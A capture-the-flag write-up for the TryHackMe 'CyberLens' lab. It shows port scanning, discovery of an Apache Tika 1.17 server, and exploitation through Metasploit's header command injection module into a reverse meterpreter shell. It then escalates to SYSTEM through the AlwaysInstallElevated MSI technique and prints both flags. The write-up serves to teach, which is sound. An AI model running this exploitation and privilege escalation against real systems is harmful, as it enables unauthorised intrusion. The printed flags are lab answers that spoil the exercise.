`host:` cyberlens.thm

### Host Enumeration with Rustscan
```r
sudo rustscan -a 10.10.15.155 -- -sS -sC
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/root/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.15.155:80
Open 10.10.15.155:135
Open 10.10.15.155:139
Open 10.10.15.155:445
Open 10.10.15.155:3389
Open 10.10.15.155:5985
Open 10.10.15.155:47001
Open 10.10.15.155:49664
Open 10.10.15.155:49665
Open 10.10.15.155:49666
Open 10.10.15.155:49667
Open 10.10.15.155:49669
Open 10.10.15.155:49668
Open 10.10.15.155:49670
Open 10.10.15.155:49677
Open 10.10.15.155:61777
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sS -sC" on ip 10.10.15.155
<< snip >>
Completed SYN Stealth Scan at 14:49, 0.40s elapsed (16 total ports)
NSE: Script scanning 10.10.15.155.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:49
NSE Timing: About 93.73% done; ETC: 14:49 (0:00:02 remaining)
NSE Timing: About 94.96% done; ETC: 14:50 (0:00:03 remaining)
NSE Timing: About 97.10% done; ETC: 14:50 (0:00:03 remaining)
NSE Timing: About 98.12% done; ETC: 14:51 (0:00:02 remaining)
Completed NSE at 14:51, 133.93s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
Nmap scan report for cyberlens.thm (10.10.15.155)
Host is up, received reset ttl 127 (0.17s latency).
Scanned at 2024-05-25 14:49:24 EDT for 134s

PORT      STATE SERVICE       REASON
80/tcp    open  http          syn-ack ttl 127
|_http-title: CyberLens: Unveiling the Hidden Matrix
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
|_ssl-date: 2024-05-25T18:49:25+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=CyberLens
| Issuer: commonName=CyberLens
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-05-24T17:37:26
| Not valid after:  2024-11-23T17:37:26
| MD5:   19a8:c5a3:9037:574d:ef21:7183:651d:a939
| SHA-1: d64c:4000:e218:201a:1030:57b0:f1e8:d93b:fa68:0dc3
| -----BEGIN CERTIFICATE-----
| MIIC1jCCAb6gAwIBAgIQZVEFvM8/QoJIMsHf/cz4azANBgkqhkiG9w0BAQsFADAU
| MRIwEAYDVQQDEwlDeWJlckxlbnMwHhcNMjQwNTI0MTczNzI2WhcNMjQxMTIzMTcz
| NzI2WjAUMRIwEAYDVQQDEwlDeWJlckxlbnMwggEiMA0GCSqGSIb3DQEBAQUAA4IB
| DwAwggEKAoIBAQDTZ7xyWB7A81qj2dCPHFmP0ZjQ77Wma7AU5Xfs+PntBnURQ1W3
| RMVyYdJxvKeuU1oIM9Bt10l6Cue9HyONhpQmf1T9GNUswhbktkzeexd95YukvCug
| Ima8nYomwx62m2L/0q4I/yjx1ELBfS9hsKZFFnf+7kENE6YRKsCcpYU/RdBxRdry
| rt+eU6N1jNnYa2nK7nw7EG1p5e5nbEKPcOSCw9gcquqPIHqluQIfDe7QnXlKvElQ
| kdU/sCU4Q+wwAn8v+h1XDBg/pdLuUJGQub0AXfv0hqM546iBMZOs/lx3SkaEiUWN
| XNEP72LTBZuSMcQqfN5hFB18jclYhCgEULVJAgMBAAGjJDAiMBMGA1UdJQQMMAoG
| CCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsFAAOCAQEAZzgarpt3
| zK6lh3dq2oo9kQ7e/pv/DqbhrB7W2Kqa0U4Ek0ND3Vqrg23KdcGM7bjy7DSwopOH
| rq3Kep3bLaWvjMQBpgnZpVFaGXypylVU3bLzFdA6zA+PHLVkkxBzvKt6qPEH7M3p
| wU9exIsQr7VtrxiFXEVbd3cgq5Cu8qmT+zo/4O0ntFwgtpyyFPkzuM/kbNMYhrt7
| Tt0wfWMtnpvcYA8MchaaF2FDGB+KFf8ygwAFo5GqUG2t+lF0gv71VGB3RvJbWevb
| GiMkFais5mRDi0Gp6EvvrpY0Iu+YMg9BRsia30xYjDWPrDMfHhN9bkG7cYD4S2G7
| 5w/1IANc+ghj1g==
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: CYBERLENS
|   NetBIOS_Domain_Name: CYBERLENS
|   NetBIOS_Computer_Name: CYBERLENS
|   DNS_Domain_Name: CyberLens
|   DNS_Computer_Name: CyberLens
|   Product_Version: 10.0.17763
|_  System_Time: 2024-05-25T18:49:25+00:00
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2024-05-25T18:49:26
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 6863/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 49555/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 45701/udp): CLEAN (Timeout)
|   Check 4 (port 21759/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 14:51
Completed NSE at 14:51, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 134.77 seconds
           Raw packets sent: 20 (856B) | Rcvd: 29 (1.224KB)

```
After running ``rustscan`` to enumerate the host for open ports and services, we found some very interesting ports and services:
- HTTP on port 80
- SMB running on port 139 and 445
- Remote Desktop Protocol (RDP) on Port 3389
- Winrm on port 47001

### Enumerating Identified Services
##### HTTP on port 80

```r
whatweb -v http://cyberlens.thm
WhatWeb report for http://cyberlens.thm
Status    : 200 OK
Title     : CyberLens: Unveiling the Hidden Matrix
IP        : 10.10.162.141
Country   : RESERVED, ZZ

Summary   : Apache[2.4.57], Bootstrap, HTML5, HTTPServer[Apache/2.4.57 (Win64)], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]

```
The results from running ``whatweb`` shows that the server is running ``Apache/2.4.557`` and it's operating system is ``Windows``.

Let's visit the webpage on ``http://cyberlens.thm``

We can see that it is just a basic webpage. Something that struck me out was that the website is also an ``image Extractor`` more or less a tool used to identify metadata in files. Let's try and upload something in the ``Upload section``.
```r
{  
"Content-Encoding": "ISO-8859-1",  
"Content-Type": "text/plain; charset=ISO-8859-1",  
"X-Parsed-By": [  
"org.apache.tika.parser.DefaultParser",  
"org.apache.tika.parser.txt.TXTParser"  
],  
"language": "en"  
}
```
This was either an error message or the default output from the ``Parser Server``. So there is another server that parsers the images that is uploaded to extract it's metadata. Probably that server is called ``org.apache.tika.parser``.

Let's use ``Gobuster`` to brute force for hidden directories and folders.

```r
gobuster dir -u http://cyberlens.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://cyberlens.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/images/]
/Images               (Status: 301) [Size: 236] [--> http://cyberlens.thm/Images/]
/css                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/css/]
/js                   (Status: 301) [Size: 232] [--> http://cyberlens.thm/js/]
/IMAGES               (Status: 301) [Size: 236] [--> http://cyberlens.thm/IMAGES/]
/%20                  (Status: 403) [Size: 199]
/*checkout*           (Status: 403) [Size: 199]
/CSS                  (Status: 301) [Size: 233] [--> http://cyberlens.thm/CSS/]
Progress: 8471 / 87665 (9.66%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 8503 / 87665 (9.70%)
===============================================================
Finished
===============================================================
```
Nothing worth going for. It doesn't seems like there would be any head way here.

Do you still remember the other server name? Let's go in search of it.

``Page source``
While going through the page source I noticed this
```r
curl -v http://cyberlens.thm/                     
* Host cyberlens.thm:80 was resolved.
* IPv6: (none)
* IPv4: 10.10.162.141
*   Trying 10.10.162.141:80...
* Connected to cyberlens.thm (10.10.162.141) port 80
> GET / HTTP/1.1

<< snip >>

var reader = new FileReader();
        reader.onload = function() {
          var fileData = reader.result;
  
          fetch("http://cyberlens.thm:61777/meta", {
            method: "PUT",
            body: fileData,
            headers: {
              "Accept": "application/json",
              "Content-Type": "application/octet-stream"
            }
          })
          .then(response => {
            if (response.ok) {
              return response.json();
            } else {
              throw new Error("Error: " + response.status);


```
fetch http://cyberlens.thm:61777/meta? I didn't see that port open in my initial enumeration.
Let's visit the site
```r
Welcome to the Apache Tika 1.17 Server

For endpoints, please see [https://wiki.apache.org/tika/TikaJAXRS](https://wiki.apache.org/tika/TikaJAXRS) and [http://tika.apache.org/1.17/miredot/index.html](http://tika.apache.org/1.17/miredot/index.html)

- **PUT** _[/detect/stream](http://cyberlens.thm:61777/detect/stream)_  
    Class: org.apache.tika.server.resource.DetectorResource  
    Method: detect  
    Produces: text/plain
```

Oh wow! ``Apache Tika 1.17`` server. Vulnerable? Maybe? Only one way to find out
```r
searchsploit apache tika                        
------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                          |  Path
------------------------------------------------------------------------ ---------------------------------
Apache Tika 1.15 - 1.17 - Header Command Injection (Metasploit)         | windows/remote/47208.rb
Apache Tika-server < 1.18 - Command Injection                           | windows/remote/46540.py
------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results

```
There are two exploits for this vulnerable ``Tika server``.
Let's first try ``Metasploit``

#### Exploiting Apache Tika Server using Metasploit
```r
msfconsole -q  
msf6 > search exploit apache tika

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/apache_tika_jp2_jscript  2018-04-25       excellent  Yes    Apache Tika Header Command Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/apache_tika_jp2_jscript                                                                                              

msf6 > use 0

```
Let's make changes to the exploit options and exploit.
```r
msf6 exploit(windows/http/apache_tika_jp2_jscript) > exploit

[*] Started reverse TCP handler on 10.9.198.175:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.10.162.141:61777/meta
[*] Sending stage (176198 bytes) to 10.10.162.141
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Meterpreter session 1 opened (10.9.198.175:4444 -> 10.10.162.141:49946) at 2024-05-25 18:19:33 -0400

meterpreter > 

```
Nice!, we got a ``meterpreter`` session on the host, let's continue exploiting the host.
```r
meterpreter > getuid
Server username: CYBERLENS\CyberLens
meterpreter > shell
Process 1896 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users 
cd C:\Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

06/06/2023  07:48 PM    <DIR>          .
06/06/2023  07:48 PM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          Administrator
11/25/2023  07:31 AM    <DIR>          CyberLens
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  14,944,796,672 bytes free


```
We can see there are two users and we are ``Cyberlens`` user. There should be a ``user.txt`` flag. Let's look for it.
```r
C:\Users>cd CyberLens
cd CyberLens

C:\Users\CyberLens>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens

11/25/2023  07:31 AM    <DIR>          .
11/25/2023  07:31 AM    <DIR>          ..
06/06/2023  07:48 PM    <DIR>          3D Objects
06/06/2023  07:48 PM    <DIR>          Contacts
06/06/2023  07:53 PM    <DIR>          Desktop
06/07/2023  03:09 AM    <DIR>          Documents
06/06/2023  07:48 PM    <DIR>          Downloads
06/06/2023  07:48 PM    <DIR>          Favorites
06/06/2023  07:48 PM    <DIR>          Links
06/06/2023  07:48 PM    <DIR>          Music
06/06/2023  07:48 PM    <DIR>          Pictures
06/06/2023  07:48 PM    <DIR>          Saved Games
06/06/2023  07:48 PM    <DIR>          Searches
06/06/2023  07:48 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,944,796,672 bytes free

C:\Users\CyberLens>cd Desktop
cd Desktop

C:\Users\CyberLens\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens\Desktop

06/06/2023  07:53 PM    <DIR>          .
06/06/2023  07:53 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,944,796,672 bytes free

C:\Users\CyberLens\Desktop>more user.txt
more user.txt
THM{T1k4-CV3-f0r-7h3-w1n}

C:\Users\CyberLens\Desktop>

```
Yes!, we got the user.txt flag, let's elevate our privileges to ``Administrator``

Let's background our session
```r
C:\Users\CyberLens\Desktop>^C
Terminate channel 1? [y/N]  y
meterpreter > getuid
Server username: CYBERLENS\CyberLens
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: 1168
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/apache_tika_jp2_jscript) > sessions 

Active sessions
===============

  Id  Name  Type                     Information                      Connection
  --  ----  ----                     -----------                      ----------
  1         meterpreter x86/windows  CYBERLENS\CyberLens @ CYBERLENS  10.9.198.175:4444 -> 10.10.162.141
                                                                      :49946 (10.10.162.141)

```
And use the ``post/multi/recon/local_exploit_suggestor`` module on Metasploit
```r
msf6 exploit(windows/http/apache_tika_jp2_jscript) > use post/multi/recon/local_exploit_suggester 
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploit
                                               s


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          1                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploit
                                               s


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.162.141 - Collecting local exploits for x86/windows...
[*] 10.10.162.141 - 193 exploit checks are being tried...
[+] 10.10.162.141 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.10.162.141 - exploit/windows/local/bypassuac_sluihijack: The target appears to be vulnerable.
[+] 10.10.162.141 - exploit/windows/local/cve_2020_1048_printerdemon: The target appears to be vulnerable.
[+] 10.10.162.141 - exploit/windows/local/cve_2020_1337_printerdemon: The target appears to be vulnerable.
[+] 10.10.162.141 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.

```
We can see that the host is vulnerable to ``exploit/windows/local/always_install_elevated`` exploit
```r
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.1.50       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/always_install_elevated) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/always_install_elevated) > set LHOST 10.9.198.175
LHOST => 10.9.198.175
msf6 exploit(windows/local/always_install_elevated) > exploit

[*] Started reverse TCP handler on 10.9.198.175:4444 
[*] Uploading the MSI to C:\Users\CYBERL~1\AppData\Local\Temp\1\FBfOMLSfng.msi ...
[*] Executing MSI...
[*] Sending stage (176198 bytes) to 10.10.162.141
[+] Deleted C:\Users\CYBERL~1\AppData\Local\Temp\1\FBfOMLSfng.msi
[*] Meterpreter session 2 opened (10.9.198.175:4444 -> 10.10.162.141:49955) at 2024-05-25 18:57:47 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 4768 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator
cd C:\Users\Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator

05/25/2024  09:29 PM    <DIR>          .
05/25/2024  09:29 PM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          3D Objects
03/17/2021  03:13 PM    <DIR>          Contacts
06/06/2023  07:45 PM    <DIR>          Desktop
03/17/2021  03:13 PM    <DIR>          Documents
06/06/2023  07:39 PM    <DIR>          Downloads
03/17/2021  03:13 PM    <DIR>          Favorites
03/17/2021  03:13 PM    <DIR>          Links
03/17/2021  03:13 PM    <DIR>          Music
03/17/2021  03:13 PM    <DIR>          Pictures
03/17/2021  03:13 PM    <DIR>          Saved Games
03/17/2021  03:13 PM    <DIR>          Searches
03/17/2021  03:13 PM    <DIR>          Videos
               0 File(s)              0 bytes
              14 Dir(s)  14,942,887,936 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

06/06/2023  07:45 PM    <DIR>          .
06/06/2023  07:45 PM    <DIR>          ..
11/27/2023  07:50 PM                24 admin.txt
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,105 bytes
               2 Dir(s)  14,942,887,936 bytes free

C:\Users\Administrator\Desktop>more admin.txt
more admin.txt
THM{3lev@t3D-4-pr1v35c!}

```
``Admin flag obtained``







